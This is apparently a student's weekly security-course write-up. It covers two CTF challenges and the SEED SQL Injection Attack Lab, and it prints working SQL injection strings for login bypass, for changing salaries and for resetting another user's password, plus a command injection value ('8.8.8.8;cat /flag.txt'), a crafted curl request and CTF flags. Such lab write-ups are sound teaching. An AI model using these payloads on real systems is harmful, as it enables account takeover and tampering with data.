# Trabalho Realizado na Semana 5

## CTF

### Desafio 1

This is a simple SQL injection attack. With the following input we could easily login as admin:

```
username: admin'-- 
password: a
```

Flag:
```
flag{3970fbb4af4d7e800b6104bb768fd072}
```

### Desafio 2

The PING tool has a vulnerability. It can be used to run multiple system commands, if they are separated by `;`. With this in mind, we can try to use the `cat` command to get the content of the flag file which is in the root directory. With the following input, we can successfully print the flag: `8.8.8.8;cat /flag.txt`.

Flag:
```
flag{3e0d6f00000e611a9c15aeb018dad2d4}
```

---

## SQL Injection Attack Lab

### Task 1

Using the command `SELECT * FROM credential WHERE Name = 'Alice';` we get Alice information.

### Task 2

#### 2.A

With the following input we can successfully login as admin:

```
username = admin' #
password = 
```

#### 2.B

Using the following command we get the same output:

```
curl 'http://www.seed-server.com/unsafe_home.php?username=admin%27+%23&Password='
```

#### 2.3

`$conn->query($sql)` only performs one SQL statement.

### Task 3

#### 3.A

First we need to login as alice. To do so, input `Alice'#` in the username.

After logging in, we can go to the edit profile page, and put the following input in any of the fields, for example, in the nickname field:

```
Alice', salary = '500000
```

This will change Alice's nickname and will change her salary to 500000.

#### 3.B

To change another persons salary, one could use the following input in any of the fields:

```
', salary = 1 where name='Boby'#
```

This will change Boby's salary to 1.

### 3.C

We can change someone's password by using the following input:

```
Phone Number = ' where name = 'Ryan'#
Password = teste
```

This changes Ryan's password to `teste`.